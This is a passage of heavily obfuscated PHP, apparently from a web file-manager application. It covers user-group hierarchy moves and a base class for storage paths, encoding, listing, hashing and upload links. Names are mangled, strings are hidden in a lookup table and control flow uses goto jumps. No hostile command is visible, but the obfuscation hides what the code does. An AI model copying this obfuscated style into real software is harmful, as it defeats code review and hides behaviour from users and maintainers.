($¹áÁäë’ as $Éì¥é¶Ú => $Ã–ÒŸèØ) { if ($Ã–ÒŸèØ) { continue; } $®¬ºı°Ù = $this->getInfoSimple($Éì¥é¶Ú); $¹áÁäë’[$Éì¥é¶Ú] = $®¬ºı°Ù[$æÉ©Æ¨ô[32]]; } $ ÁäÜ­ = $GLOBALS[$æÉ©Æ¨ô[6]][$æÉ©Æ¨ô[89]][$æÉ©Æ¨ô[1960]]; if ($GLOBALS[$æÉ©Æ¨ô[503]] == $æÉ©Æ¨ô[88]) { $ ÁäÜ­ = !1; } foreach ($åÉÙ´ÂÒ as &$•© Çñ) { $“”êª˜¹ = $this->parentLevelArray($•© Çñ[$æÉ©Æ¨ô[521]]); $ÔùîÊ’ = $æÉ©Æ¨ô[12]; foreach ($“”êª˜¹ as $Éì¥é¶Ú => $‰¢ó©çĞ) { if ($ ÁäÜ­ && $Éì¥é¶Ú == 0) { continue; } $ÔùîÊ’ .= $¹áÁäë’[$‰¢ó©çĞ] . $æÉ©Æ¨ô[8]; } if ($“”êª˜¹) { $ÔùîÊ’ .= $•© Çñ[$æÉ©Æ¨ô[32]]; } $•© Çñ[$æÉ©Æ¨ô[526]] = str_replace($æÉ©Æ¨ô[529], $æÉ©Æ¨ô[8], $ÔùîÊ’); } unset($•© Çñ); } private function _listAppendSourceRoot(&$øîÕİõ, $±°Ë¦ÖÙ) { $‚ââÎ˜Ë =& $_SERVER[Ì¥ŞÒ°£]; $ìŠê’™¢ = Model($‚ââÎ˜Ë[827])->listSourceRoot(SourceModel::TYPE_GROUP, $±°Ë¦ÖÙ); $ìŠê’™¢ = array_to_keyvalue($ìŠê’™¢, $‚ââÎ˜Ë[505]); $ìŠê’™¢ = array_remove_key($ìŠê’™¢, $‚ââÎ˜Ë[505]); foreach ($øîÕİõ as &$ÁÇêî˜¦) { $ÁÇêî˜¦[$‚ââÎ˜Ë[86]] = $ìŠê’™¢[$ÁÇêî˜¦[$‚ââÎ˜Ë[1857]]] ? $ìŠê’™¢[$ÁÇêî˜¦[$‚ââÎ˜Ë[1857]]] : array(); } unset($ÁÇêî˜¦); } protected function groupMerge($Á‘©¡¦) { $Á‘©¡¦ = array_values(array_unique($Á‘©¡¦)); $…Ä­æ¯ = array(); for ($ÉôÂÉ‰™ = 0; $ÉôÂÉ‰™ < count($Á‘©¡¦); $ÉôÂÉ‰™++) { $öÉêÇ™‘ = !1; for ($ãÖ·‡ = 0; $ãÖ·‡ < count($Á‘©¡¦); $ãÖ·‡++) { if ($ÉôÂÉ‰™ == $ãÖ·‡) { continue; } if ($this->isParentOf($Á‘©¡¦[$ãÖ·‡], $Á‘©¡¦[$ÉôÂÉ‰™])) { $öÉêÇ™‘ = !0; break; } } if (!$öÉêÇ™‘) { $…Ä­æ¯[] = $Á‘©¡¦[$ÉôÂÉ‰™]; } } return $…Ä­æ¯; } protected function isParentOf($âÇ¬ï¯, $¶²ªÂÜÇ) { $ä¼üÃäÁ =& $_SERVER[Ì¥ŞÒ°£]; if (!$âÇ¬ï¯ || !$¶²ªÂÜÇ || $âÇ¬ï¯ == $¶²ªÂÜÇ) { return !1; } $€Û‚™ß® = $this->getInfoSimple($âÇ¬ï¯); $á¥™ò÷õ = $this->getInfoSimple($¶²ªÂÜÇ); $ŠÅıŒ«İ = $€Û‚™ß®[$ä¼üÃäÁ[521]] . $âÇ¬ï¯ . $ä¼üÃäÁ[50]; if (substr($á¥™ò÷õ[$ä¼üÃäÁ[521]], 0, strlen($ŠÅıŒ«İ)) == $ŠÅıŒ«İ) { return !0; } return !1; } public function groupShowRoot($«ó“µá, $óŒÉ² = false) { $Œ¸”¶ë· =& $_SERVER[Ì¥ŞÒ°£]; $ğŞÔıÎ = $this->getInfo($«ó“µá); if (!$ğŞÔıÎ) { return array(); } $í‹ıŒ = $this->parentLevelArray($ğŞÔıÎ[$Œ¸”¶ë·[521]]); $è•çÁ = array($«ó“µá); if (count($í‹ıŒ) == 0) { return $è•çÁ; } if ($óŒÉ² && count($í‹ıŒ) == 1) { return $è•çÁ; } if (!$ğŞÔıÎ[$Œ¸”¶ë·[466]] || !isset($ğŞÔıÎ[$Œ¸”¶ë·[466]][$Œ¸”¶ë·[1943]]) || $ğŞÔıÎ[$Œ¸”¶ë·[466]][$Œ¸”¶ë·[1943]] == $Œ¸”¶ë·[1912]) { return $this->groupShowRoot($í‹ıŒ[count($í‹ıŒ) - 1], $óŒÉ²); } if ($ğŞÔıÎ[$Œ¸”¶ë·[466]][$Œ¸”¶ë·[1943]] == $Œ¸”¶ë·[357]) { $Ÿ‹ú½Œ­ = explode($Œ¸”¶ë·[50], $ğŞÔıÎ[$Œ¸”¶ë·[466]][$Œ¸”¶ë·[1944]]); if ($Ÿ‹ú½Œ­) { $è•çÁ = array_merge($è•çÁ, $Ÿ‹ú½Œ­); } } return $è•çÁ; } protected function resetParentLevel() { $üøªÜÕ• =& $_SERVER[Ì¥ŞÒ°£]; $œñˆ¨¾² = $üøªÜÕ•[1857]; $åÏ±®¦ = $this->select(); $åÏ±®¦ = array_to_keyvalue($åÏ±®¦, $œñˆ¨¾²); foreach ($åÏ±®¦ as $½æìÒ–) { $ûï–ÚÄš = $½æìÒ–; $”¿¸ì ¨ = array(); while ($ûï–ÚÄš[$üøªÜÕ•[432]] != 0) { $”¿¸ì ¨[] = $ûï–ÚÄš[$üøªÜÕ•[432]]; $ûï–ÚÄš = $åÏ±®¦[$ûï–ÚÄš[$üøªÜÕ•[432]]]; } $”¿¸ì ¨[] = 0; $”¿¸ì ¨ = $üøªÜÕ•[50] . implode($üøªÜÕ•[50], array_reverse($”¿¸ì ¨)) . $üøªÜÕ•[50]; $this->setNamePinyin($½æìÒ–[$œñˆ¨¾²], $½æìÒ–[$üøªÜÕ•[32]]); $this->where(array($œñˆ¨¾² => $½æìÒ–[$œñˆ¨¾²]))->save(array($üøªÜÕ•[590] => $”¿¸ì ¨)); } return $åÏ±®¦; } public function groupNameAuto($­ñûêË¨, $ù»¹ÀÓØ) { $†˜ÊÉêØ =& $_SERVER[Ì¥ŞÒ°£]; $±Û¿¦ì = $this->where(array($†˜ÊÉêØ[401] => $­ñûêË¨))->getField($†˜ÊÉêØ[32], !0); if (!$±Û¿¦ì || !in_array($ù»¹ÀÓØ, $±Û¿¦ì)) { return $ù»¹ÀÓØ; } for ($´ıèö« = 1; $´ıèö« <= count($±Û¿¦ì) + 1; $´ıèö«++) { $ñöİë = $ù»¹ÀÓØ . "\50{$´ıèö«}\51"; if (!in_array($ñöİë, $±Û¿¦ì)) { return $ñöİë; } } } public function groupSwitch($Ûò³ÍßÚ, $ÖîåŠÂâ) { $‹şü¨Ôø =& $_SERVER[Ì¥ŞÒ°£]; $š˜ÅÄş = array($‹şü¨Ôø[1857] => array($‹şü¨Ôø[7], array($Ûò³ÍßÚ, $ÖîåŠÂâ))); $ı«óÌŠ = $this->where($š˜ÅÄş)->select(); $ı«óÌŠ = array_to_keyvalue($ı«óÌŠ, $‹şü¨Ôø[1857]); if (!isset($ı«óÌŠ[$Ûò³ÍßÚ]) || !isset($ı«óÌŠ[$ÖîåŠÂâ]) || $ı«óÌŠ[$Ûò³ÍßÚ][$‹şü¨Ôø[432]] == 0) { return !1; } $š˜ÅÄş = array($‹şü¨Ôø[1857] => $Ûò³ÍßÚ); $Œ†’¹Îº = Model($‹şü¨Ôø[1947])->where($š˜ÅÄş)->select(); if (!$Œ†’¹Îº) { $Œ†’¹Îº = array(); } foreach ($Œ†’¹Îº as $¥×ò´Ê¢) { $í¹¸¸ü = $¥×ò´Ê¢[$‹şü¨Ôø[1667]]; $š˜ÅÄş = array($‹şü¨Ôø[1667] => $í¹¸¸ü, $‹şü¨Ôø[1857] => $ÖîåŠÂâ); $ıÒî ‘Ò = Model($‹şü¨Ôø[1947])->where($š˜ÅÄş)->find(); if (!$ıÒî ‘Ò) { $ôæú›€´ = array($ÖîåŠÂâ => $¥×ò´Ê¢[$‹şü¨Ôø[1961]]); Model($‹şü¨Ôø[535])->userGroupAdd($í¹¸¸ü, $ôæú›€´); } Model($‹şü¨Ôø[535])->userGroupRemove($í¹¸¸ü, $Ûò³ÍßÚ); } $š˜ÅÄş = array($‹şü¨Ôø[411] => 2, $‹şü¨Ôø[432] => 0, $‹şü¨Ôø[410] => 1, $‹şü¨Ôø[505] => array($‹şü¨Ôø[7], array($Ûò³ÍßÚ, $ÖîåŠÂâ))); $ûá•¤Òê = Model($‹şü¨Ôø[827])->where($š˜ÅÄş)->field($‹şü¨Ôø[1962])->select(); $ûá•¤Òê = array_to_keyvalue($ûá•¤Òê, $‹şü¨Ôø[505], $‹şü¨Ôø[402]); $ç—»¿ëÔ = !empty($ûá•¤Òê[$Ûò³ÍßÚ]) ? $ûá•¤Òê[$Ûò³ÍßÚ] : !1; if ($ç—»¿ëÔ) { if (!$ûá•¤Òê[$ÖîåŠÂâ]) { $ûá•¤Òê[$ÖîåŠÂâ] = Model($‹şü¨Ôø[827])->groupRootAdd($ÖîåŠÂâ); } $Ú³ÛÛ­‰ = $ûá•¤Òê[$ÖîåŠÂâ]; $š˜ÅÄş = array($‹şü¨Ôø[432] => $ç—»¿ëÔ); $ûá•¤Òê = Model($‹şü¨Ôø[827])->where($š˜ÅÄş)->field($‹şü¨Ôø[1963])->select(); if (!$ûá•¤Òê) { $ûá•¤Òê = array(); } Model($‹şü¨Ôø[827])->moveClearAuth = !1; foreach ($ûá•¤Òê as $ß“À§«‰) { $À÷°ÙäÕ = $ß“À§«‰[$‹şü¨Ôø[410]] == $‹şü¨Ôø[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($‹şü¨Ôø[827])->move($ß“À§«‰[$‹şü¨Ôø[402]], $Ú³ÛÛ­‰, $À÷°ÙäÕ); } Model($‹şü¨Ôø[827])->moveClearAuth = !0; $š˜ÅÄş = array($‹şü¨Ôø[411] => 2, $‹şü¨Ôø[505] => $Ûò³ÍßÚ); $ı»ûóĞæ = array($‹şü¨Ôø[505] => $ÖîåŠÂâ); Model($‹şü¨Ôø[1964])->where($š˜ÅÄş)->save($ı»ûóĞæ); Model($‹şü¨Ôø[1965])->where($š˜ÅÄş)->save($ı»ûóĞæ); } $this->_changeChildLevel($ı«óÌŠ[$Ûò³ÍßÚ], $ı«óÌŠ[$ÖîåŠÂâ], !0); $this->where(array($‹şü¨Ôø[432] => $Ûò³ÍßÚ))->save(array($‹şü¨Ôø[432] => $ÖîåŠÂâ)); $this->_clearChildrenCache($ı«óÌŠ[$ÖîåŠÂâ]); return !0; } } goto dáÉÜÌá¼Ù; D†Ó®¦Îë‹: define($_SERVER[Ì¥ŞÒ°£][238], 1); define($_SERVER[Ì¥ŞÒ°£][239], 2); define($_SERVER[Ì¥ŞÒ°£][240], 3); goto fãÙ‹×ø›; B¯Õßì©®: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $™¨Äëõ =& $_SERVER[Ì¥ŞÒ°£]; $this->objectDriver = array($™¨Äëõ[60], $™¨Äëõ[61], $™¨Äëõ[62], $™¨Äëõ[63], $™¨Äëõ[64], $™¨Äëõ[65], $™¨Äëõ[66], $™¨Äëõ[67], $™¨Äëõ[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¿šÚø‚Ë) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¿šÚø‚Ë, $_SERVER[Ì¥ŞÒ°£][8]); } return $¿šÚø‚Ë; } public function iconvApp($¶âúÉ£¤) { return $¶âúÉ£¤; } public function iconvSystem($şçÚÁ‡˜) { return $şçÚÁ‡˜; } public function iconvTo($­ëØçè«, $ öÑ–ğ, $™‘éÍ¨¤) { $£œ™©Ç® =& $_SERVER[Ì¥ŞÒ°£]; if (!$­ëØçè« || !function_exists($£œ™©Ç®[69])) { return $­ëØçè«; } static $ÌôıŞòŞ = array(); $åóšÚâŞ = $ öÑ–ğ . $£œ™©Ç®[70] . $™‘éÍ¨¤ . $£œ™©Ç®[71] . $­ëØçè«; if (isset($ÌôıŞòŞ[$åóšÚâŞ])) { return $ÌôıŞòŞ[$åóšÚâŞ]; } if (function_exists($£œ™©Ç®[72])) { $–µƒ“Êá = @mb_convert_encoding($­ëØçè«, $™‘éÍ¨¤, $ öÑ–ğ); } else { $–µƒ“Êá = @iconv($ öÑ–ğ, $™‘éÍ¨¤, $­ëØçè«); } $–µƒ“Êá = $–µƒ“Êá ? $–µƒ“Êá : $­ëØçè«; if (strstr($–µƒ“Êá, $£œ™©Ç®[73])) { $–µƒ“Êá = str_replace($£œ™©Ç®[73], $£œ™©Ç®[11], $–µƒ“Êá); } $ÌôıŞòŞ[$ öÑ–ğ . $£œ™©Ç®[70] . $™‘éÍ¨¤ . $£œ™©Ç®[71] . $­ëØçè«] = $–µƒ“Êá; $ÌôıŞòŞ[$™‘éÍ¨¤ . $£œ™©Ç®[70] . $ öÑ–ğ . $£œ™©Ç®[71] . $­ëØçè«] = $­ëØçè«; $ÌôıŞòŞ[$™‘éÍ¨¤ . $£œ™©Ç®[70] . $ öÑ–ğ . $£œ™©Ç®[71] . $–µƒ“Êá] = $­ëØçè«; $ÌôıŞòŞ[$ öÑ–ğ . $£œ™©Ç®[70] . $™‘éÍ¨¤ . $£œ™©Ç®[71] . $–µƒ“Êá] = $–µƒ“Êá; return $–µƒ“Êá; } public function getPathInner($çÖ¼ÙÆ») { $¹ïõ¸ïı = IO::init($çÖ¼ÙÆ»); return $¹ïõ¸ïı->path; } public function getPathOuter($Çû×¸ùœ) { $•íÄ¬ =& $_SERVER[Ì¥ŞÒ°£]; $ê…Ëõ…© = strlen(trim($this->pathBase, $•íÄ¬[8])); $Çû×¸ùœ = substr(trim($Çû×¸ùœ, $•íÄ¬[8]), $ê…Ëõ…©); return $this->pathDriver . $•íÄ¬[8] . ltrim($Çû×¸ùœ, $•íÄ¬[8]); } public function isParentOf($ˆ‰³Ù¥, $äèØåâ) { $‰òîøÚó =& $_SERVER[Ì¥ŞÒ°£]; $ˆ‰³Ù¥ = rtrim(strtolower($ˆ‰³Ù¥), $‰òîøÚó[8]) . $‰òîøÚó[8]; $äèØåâ = rtrim(strtolower($äèØåâ), $‰òîøÚó[8]) . $‰òîøÚó[8]; $æ³šÃª = strpos($äèØåâ, $ˆ‰³Ù¥) === 0; return $æ³šÃª; } public function getType() { $Éò¥ç› =& $_SERVER[Ì¥ŞÒ°£]; $ŠïÂÖÊ× = str_replace($Éò¥ç›[74], $Éò¥ç›[12], get_class($this)); return strtolower($ŠïÂÖÊ×); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ÒÚŸ‹Îë, $ï„Œ€ò) { $ÏæáÙ× =& $_SERVER[Ì¥ŞÒ°£]; $™¾ÑÌ² = rtrim($ÒÚŸ‹Îë, $ÏæáÙ×[8]) . $ÏæáÙ×[8] . $ï„Œ€ò; $Ü“ç‘ñÓ = $this->exist($™¾ÑÌ²); return $Ü“ç‘ñÓ ? $™¾ÑÌ² : !1; } public function setModifyTime($‰Á·–çÈ, $«“ü¦ƒÊ = '') { } public function renameObject($¼ö²£±, $Ğ®‘ÏŞ) { $­¥³Ï”‹ = $Ğ®‘ÏŞ; $¼ö²£± = $this->getPathOuter($¼ö²£±); $Ğ®‘ÏŞ = $this->pathFather($¼ö²£±) . $Ğ®‘ÏŞ; $ÇÀÑÃÊå = IO::copy($¼ö²£±, $this->pathFather($¼ö²£±), REPEAT_RENAME_FOLDER, $­¥³Ï”‹); if ($ÇÀÑÃÊå) { IO::remove($¼ö²£±); } return $ÇÀÑÃÊå ? $Ğ®‘ÏŞ : !1; } public function tempFile($ŞÊ±œİ® = '', $¸§·•‡ü = '') { if (!$ŞÊ±œİ®) { $ŞÊ±œİ® = rand_string(15); } $ËÊÇÉ¡» = TEMP_FILES . rand_string(15) . $_SERVER[Ì¥ŞÒ°£][8]; @mkdir($ËÊÇÉ¡», DEFAULT_PERRMISSIONS, !0); $Ö¶şĞÒ = $ËÊÇÉ¡» . $ŞÊ±œİ®; @touch($Ö¶şĞÒ); if ($¸§·•‡ü) { file_put_contents($Ö¶şĞÒ, $¸§·•‡ü); } return $Ö¶şĞÒ; } public function tempFileRemve($¾Ş’¥ª‡) { @unlink($¾Ş’¥ª‡); @rmdir($this->pathFather($¾Ş’¥ª‡)); } public function mkfile($Í¤ªê , $«©Úé·à = '', $şˆåÒœ´ = REPEAT_RENAME) { } public function mkdir($¤×¯Ñ¬, $ìö³“›Î = REPEAT_SKIP) { } public function delFile($¥¤Š–§¸) { } public function delFolder($Ç´ıÂåœ) { } public function copyFile($çƒÒéÄ‰, $ş·ü©€¸) { } public function moveFile($§‡Š¥½í, $Ğ‡¶ªçÅ) { } public function remove($©ó¾Ù™Ë) { if ($this->isFile($©ó¾Ù™Ë)) { return $this->delFile($©ó¾Ù™Ë); } return $this->delFolder($©ó¾Ù™Ë); } public function rename($Áä¦Ê—, $ô×›ğ´º) { } public function exist($êó¿Š™î) { } public function findByHash($¥ß±˜É = '', $“Šæ¯© = '') { return !1; } public function isFile($àÈ—òì) { } public function isFolder($şù©¹˜„) { } public function size($èÀ¾ÜäÓ) { } public function info($¬‘ñƒ¡ˆ) { } public function infoSimple($¸Šô»¬) { return $this->info($¸Šô»¬); } public function infoAuth($±ëÑ×ïÚ) { return $this->info($±ëÑ×ïÚ); } public function infoFull($Ú”©Ô©ò) { return $this->info($Ú”©Ô©ò); } public function infoWithChildren($ñ¥ãûò–) { $²õç”Ş† =& $_SERVER[Ì¥ŞÒ°£]; static $¾¢ÂòÏô = array(); if (isset($¾¢ÂòÏô[$ñ¥ãûò–])) { return $¾¢ÂòÏô[$ñ¥ãûò–]; } $àÎ€†Ç = $this->info($ñ¥ãûò–); if ($àÎ€†Ç && $àÎ€†Ç[$²õç”Ş†[33]] == $²õç”Ş†[75]) { $ó­â«“ = array($²õç”Ş†[76] => 0, $²õç”Ş†[77] => 0, $²õç”Ş†[78] => 0); $this->infoChildren($ñ¥ãûò–, $ó­â«“); $àÎ€†Ç[$²õç”Ş†[76]] = $ó­â«“[$²õç”Ş†[76]]; $àÎ€†Ç[$²õç”Ş†[79]] = array($²õç”Ş†[80] => $ó­â«“[$²õç”Ş†[77]], $²õç”Ş†[81] => $ó­â«“[$²õç”Ş†[78]]); $¾¢ÂòÏô[$ñ¥ãûò–] = $àÎ€†Ç; } return $àÎ€†Ç; } public function listPath($òÑÉ˜š¦, $ÓãûÖŞÎ = false) { } public function has($Í±àå€Ù, $ä”Î…öÂ = false, $ªİà¤’ç = false) { } public function canRead($˜¥Ÿˆ) { } public function canWrite($°Ô¶«) { } public function getContent($ñù²²ã©) { } public function setContent($–Ïµ™Æ, $Ø¥ÏÇ˜Ü = '') { } protected function infoChildren($êÙ¯›ª„, &$¸À™ƒĞ) { $ÄÖšš‹İ =& $_SERVER[Ì¥ŞÒ°£]; check_abort_echo(); $Àá¿ßÄ­ = $this->listPath($êÙ¯›ª„, !0); $Àá¿ßÄ­ = array_merge($Àá¿ßÄ­[$ÄÖšš‹İ[82]], $Àá¿ßÄ­[$ÄÖšš‹İ[83]]); foreach ($Àá¿ßÄ­ as $¥¤ˆ´°Á) { if ($¥¤ˆ´°Á[$ÄÖšš‹İ[33]] == $ÄÖšš‹İ[75]) { $¸À™ƒĞ[$ÄÖšš‹İ[78]]++; $Ê˜ÕóÛ = $this->getPathInner($¥¤ˆ´°Á[$ÄÖšš‹İ[84]]); $this->infoChildren($Ê˜ÕóÛ, $¸À™ƒĞ); } else { $¸À™ƒĞ[$ÄÖšš‹İ[77]]++; $¸À™ƒĞ[$ÄÖšš‹İ[76]] += $¥¤ˆ´°Á[$ÄÖšš‹İ[76]]; } } } public function fileSubstr($Šêş÷Ï…, $Œ–¬•‹™, $îˆÆ¿à) { } public function listAll($ŸúÁ¡’¤) { } public function listAllMake($½üÖñ¡º, &$­µÆ°¼) { $ËÔ‚™Ò° =& $_SERVER[Ì¥ŞÒ°£]; check_abort_echo(); $®ß’µ»• = $this->listPath($½üÖñ¡º, !0); if (!$®ß’µ»•) { return; } $ºïŠ¡ = array_merge($®ß’µ»•[$ËÔ‚™Ò°[82]], $®ß’µ»•[$ËÔ‚™Ò°[83]]); foreach ($ºïŠ¡ as $ãĞõÅ©) { $÷ö—ÅÖÍ = $ãĞõÅ©[$ËÔ‚™Ò°[33]] == $ËÔ‚™Ò°[75]; $„²ÆÇÜ = array($ËÔ‚™Ò°[84] => $ãĞõÅ©[$ËÔ‚™Ò°[84]], $ËÔ‚™Ò°[75] => $÷ö—ÅÖÍ); if (isset($ãĞõÅ©[$ËÔ‚™Ò°[76]])) { $„²ÆÇÜ[$ËÔ‚™Ò°[76]] = $ãĞõÅ©[$ËÔ‚™Ò°[76]]; } if (isset($ãĞõÅ©[$ËÔ‚™Ò°[85]])) { $„²ÆÇÜ[$ËÔ‚™Ò°[85]] = $ãĞõÅ©[$ËÔ‚™Ò°[85]]; } if (!$÷ö—ÅÖÍ) { $­µÆ°¼[] = $„²ÆÇÜ; continue; } $­µÆ°¼[] = $„²ÆÇÜ; $ â½æà¿ = $ãĞõÅ©[$ËÔ‚™Ò°[84]]; $êùÖë¯Ï = $this->pathDriver; if (substr($ãĞõÅ©[$ËÔ‚™Ò°[84]], 0, strlen($êùÖë¯Ï)) == $êùÖë¯Ï) { $ â½æà¿ = substr($ â½æà¿, strlen($êùÖë¯Ï)); } $this->listAllMake($ â½æà¿, $­µÆ°¼); } } public function listAllSimple($Å‹×Æº) { $ÆìÖ·¶ğ =& $_SERVER[Ì¥ŞÒ°£]; $ùÕ¬Øªü = array(); $ôùô¤‡ = $this->listAll($Å‹×Æº); $ğ¡°–²à = $this->getPathOuter($Å‹×Æº); foreach ($ôùô¤‡ as $˜Ê›€İ¢) { $©­«®í = $˜Ê›€İ¢[$ÆìÖ·¶ğ[84]]; $®¤—è‚ = $˜Ê›€İ¢[$ÆìÖ·¶ğ[84]]; if (isset($˜Ê›€İ¢[$ÆìÖ·¶ğ[86]])) { $©­«®í = $˜Ê›€İ¢[$ÆìÖ·¶ğ[86]][$ÆìÖ·¶ğ[84]]; $˜Ê›€İ¢[$ÆìÖ·¶ğ[76]] = $˜Ê›€İ¢[$ÆìÖ·¶ğ[86]][$ÆìÖ·¶ğ[76]]; $˜Ê›€İ¢[$ÆìÖ·¶ğ[85]] = $˜Ê›€İ¢[$ÆìÖ·¶ğ[86]][$ÆìÖ·¶ğ[85]]; } else { $®¤—è‚ = substr($˜Ê›€İ¢[$ÆìÖ·¶ğ[84]], strlen(get_path_father($ğ¡°–²à))); $®¤—è‚ = $ÆìÖ·¶ğ[8] . ltrim($®¤—è‚, $ÆìÖ·¶ğ[8]); } $¤õ®¾‹ = array($ÆìÖ·¶ğ[84] => $®¤—è‚, $ÆìÖ·¶ğ[75] => $˜Ê›€İ¢[$ÆìÖ·¶ğ[75]]); if (isset($˜Ê›€İ¢[$ÆìÖ·¶ğ[76]]) && !$˜Ê›€İ¢[$ÆìÖ·¶ğ[75]]) { $¤õ®¾‹[$ÆìÖ·¶ğ[76]] = $˜Ê›€İ¢[$ÆìÖ·¶ğ[76]]; } if (isset($˜Ê›€İ¢[$ÆìÖ·¶ğ[85]])) { $¤õ®¾‹[$ÆìÖ·¶ğ[85]] = $˜Ê›€İ¢[$ÆìÖ·¶ğ[85]]; } if (!$˜Ê›€İ¢[$ÆìÖ·¶ğ[75]]) { $¤õ®¾‹[$ÆìÖ·¶ğ[87]] = $©­«®í; } $ùÕ¬Øªü[] = $¤õ®¾‹; } return $ùÕ¬Øªü; } public function upload($¿£©•‰ê, $­§Òø¤­, $“ÓïÖâº = false, $äœìîê• = REPEAT_REPLACE) { } public function uploadFileByID($£ªŠ·¨¤, $ˆø®Ëó, $¯ñçüç¸) { } public function uploadFileByPath($ÉÇ©©¬, $Ğæƒùêš, $ÖÚÙÖñ = array()) { } public function isUploadServer() { $Âñó¾–ş =& $_SERVER[Ì¥ŞÒ°£]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Âñó¾–ş[88]) { return !0; } return $GLOBALS[$Âñó¾–ş[6]][$Âñó¾–ş[89]][$Âñó¾–ş[90]]; } public function isFileOutServer() { $¼ß¢›¯ƒ =& $_SERVER[Ì¥ŞÒ°£]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $¼ß¢›¯ƒ[88]) { return !0; } return $GLOBALS[$¼ß¢›¯ƒ[6]][$¼ß¢›¯ƒ[89]][$¼ß¢›¯ƒ[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($öîÃïä) { $‚Ÿ±Ù° =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->isCdnHost()) { return $öîÃïä; } return str_replace(trim(get_url_root($öîÃïä), $‚Ÿ±Ù°[8]), trim($this->cdnHost, $‚Ÿ±Ù°[8]), $öîÃïä); } public function uploadLink($¦˜æ“…Ü, $°ğù¥ˆ = 0) { $Ì´äÚÒ¿ =& $_SERVER[Ì¥ŞÒ°£]; if ($this->isUploadServer()) { return; } $¡¬øö Ú = $this->getType(); if (!in_array($¡¬øö Ú, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Èúµò˜ = 1024 * 1024 * 10; $…ûŠ­© = $°ğù¥ˆ <= $Èúµò˜ ? $Ì´äÚÒ¿[92] : $Ì´äÚÒ¿[93]; $¿­ùƒœ¦ = (!$°ğù¥ˆ ? 1 : ceil($°ğù¥ˆ / pow(1024, 3))) * 3600 * 4; $îœ÷ …° = $this->{$…ûŠ­©}($¦˜æ“…Ü, $¿­ùƒœ¦); if ($îœ÷ …°) { $îœ÷ …°[$Ì´äÚÒ¿[94]] = $¦˜æ“…Ü; $îœ÷ …°[$Ì´äÚÒ¿[95]] = $¡¬øö Ú; } return $îœ÷ …°; } public function uploadFormData($¬ÒÅÌˆ, $Ü½¹½ĞÊ = 3600) { } public function multiUploadFormData($·È½³Æ½, $ìÆë¶˜‚ = 3600) { } public function download($àúÌøàÅ, $ùÒÌÀ•”) { } public function ext($ßˆîàı) { $İ£Şø÷ =& $_SERVER[Ì¥ŞÒ°£]; if (strpos($ßˆîàı, $İ£Şø÷[8]) === -1) { $§–‰¢Ğü = $ßˆîàı; } else { $§–‰¢Ğü = $this->pathThis($ßˆîàı); } $ı¿›ûøŒ = $İ£Şø÷[12]; if (strstr($§–‰¢Ğü, $İ£Şø÷[10])) { $ı¿›ûøŒ = substr($§–‰¢Ğü, strrpos($§–‰¢Ğü, $İ£Şø÷[10]) + 1); $ı¿›ûøŒ = strtolower($ı¿›ûøŒ); } if (strlen($ı¿›ûøŒ) > 3 && preg_match($İ£Şø÷[96], $ı¿›ûøŒ, $’ Ø‰ø•)) { $ı¿›ûøŒ = $İ£Şø÷[12]; } return $ı¿›ûøŒ; } public function pathThis($¥”¥•å) { $×Ãóæã =& $_SERVER[Ì¥ŞÒ°£]; $¥”¥•å = str_replace($×Ãóæã[97], $×Ãóæã[8], rtrim($¥”¥•å, $×Ãóæã[8])); $„ËÉ—ª = strrpos($¥”¥•å, $×Ãóæã[8]); if ($„ËÉ—ª === !1) { return $¥”¥•å; } return substr($¥”¥•å, $„ËÉ—ª + 1); } public function pathFather($š§¹ûù) { $´¬î×ÉÌ =& $_SERVER[Ì¥ŞÒ°£]; $š§¹ûù = str_replace($´¬î×ÉÌ[97], $´¬î×ÉÌ[8], rtrim($š§¹ûù, $´¬î×ÉÌ[8])); $¹Üı„«Ò = strrpos($š§¹ûù, $´¬î×ÉÌ[8]); if ($¹Üı„«Ò === !1) { return $´¬î×ÉÌ[12]; } return substr($š§¹ûù, 0, $¹Üı„«Ò + 1); } public function hashSimple($ìÊâÌŒ) { $“…œúšœ =& $_SERVER[Ì¥ŞÒ°£]; if (!$ìÊâÌŒ) { return md5($“…œúšœ[12]); } $¥ïêÎÎ = $this->size($ìÊâÌŒ); $¹ü™…¾È = 200; $ÛÆÅ‡è = 50; if ($¥ïêÎÎ <= $¹ü™…¾È * $ÛÆÅ‡è) { return $this->hashMd5($ìÊâÌŒ) . $¥ïêÎÎ; } $„¶úğÅ† = intval($¥ïêÎÎ / $ÛÆÅ‡è); $ßŠÔòÜ = $“…œúšœ[12]; for ($À¥ÃÉ¶ = 0; $À¥ÃÉ¶ < $ÛÆÅ‡è; $À¥ÃÉ¶++) { $ßŠÔòÜ .= $this->fileSubstr($ìÊâÌŒ, $„¶úğÅ† * $À¥ÃÉ¶, $¹ü™…¾È); } $ßŠÔòÜ .= $this->fileSubstr($ìÊâÌŒ, $¥ïêÎÎ - $¹ü™…¾È, $¹ü™…¾È); return md5($ßŠÔòÜ) . $¥ïêÎÎ; } public static $md5Cache = array(); public function hashMd5($ñÆ¿‘–‡) { if (!$ñÆ¿‘–‡) { return md5($_SERVER[Ì¥ŞÒ°£][12]); } $ñÆ¿‘–‡ = $this->iconvSystem($ñÆ¿‘–‡); if (isset(self::$md5Cache[$ñÆ¿‘–‡])) { return self::$md5Cache[$ñÆ¿‘–‡]; } self::$md5Cache[$ñÆ¿‘–‡] = $this->hashMd5Shell($ñÆ¿‘–‡); if (!self::$md5Cache[$ñÆ¿‘–‡]) { self::$md5Cache[$ñÆ¿‘–‡] = @md5_file($ñÆ¿‘–‡); } return self::$md5Cache[$ñÆ¿‘–‡]; } private function hashMd5Shell($îëëÎí¤) { $º½¤¡¾ =& $_SERVER[Ì¥ŞÒ°£]; if (!$îëëÎí¤) { return md5($º½¤¡¾[12]); } if (!function_exists($º½¤¡¾[98])) { return !1; } $ƒ®™µÖ£ = array($º½¤¡¾[99], $º½¤¡¾[100]); $é²Ö¦Å = 